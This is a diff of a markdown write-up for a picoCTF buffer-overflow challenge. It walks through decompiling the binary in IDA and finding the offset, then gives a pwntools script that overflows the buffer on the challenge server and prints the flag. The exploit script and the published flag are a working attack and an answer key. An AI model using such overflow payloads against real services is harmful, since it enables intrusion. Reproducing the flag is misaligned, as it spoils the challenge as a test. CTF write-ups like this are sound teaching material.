@@ -149,11 +149,55 @@ int main(void)
 ![image](https://user-images.githubusercontent.com/70703371/185042736-2ed627da-59e2-494c-a605-ba6a6eef21a1.png)
 
 19. Not the `deadbeef`.
-20. Let's take this value and convert it to ascii.
+20. Let's open the program file in IDA.
 
-![image](https://user-images.githubusercontent.com/70703371/185043105-2f347ebf-0caa-486d-8888-222f4f062ec4.png)
+![image](https://user-images.githubusercontent.com/70703371/185046700-02658b5a-6fea-445f-bed7-97c0ed980e88.png)
 
-21. 
+21. Press `f5` to decompile it.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/185046743-26932b91-d873-4f51-bd90-9dbe402d72d2.png)
+
+22. Hmm.. The size changed to 264 and not 256.
+
+![image](https://user-images.githubusercontent.com/70703371/185046800-933d07b2-7608-42dd-90da-651af7d9fb6c.png)
+
+23. Kinda confused here.
+24. Now let's jump to `rsp+0h`.
+
+> STACK
+
+![image](https://user-images.githubusercontent.com/70703371/185046984-45d6369d-cbd1-4e4f-b98b-71af1ee0f37c.png)
+
+25. Seems the correct bytes to do buffer overflow is 264 + 8 + 8 -> 280 bytes.
+26. For this solution i made a python script using `ret2win` concept.
+
+```py
+from pwn import *
+
+offset = 0x108 # 264
+
+payload = flat(b'A' * offset, 0xdeadbeef)
+
+sh = remote('mars.picoctf.net', 31890)
+
+sh.sendlineafter('see?\n', payload)
+
+sh.interactive()
+
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/185056804-d79fdbb9-e136-44fa-af56-f2f1a4ed6353.png)
+
+
+27. Finally, we got the flag!
+
+```
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+```
 
 
 
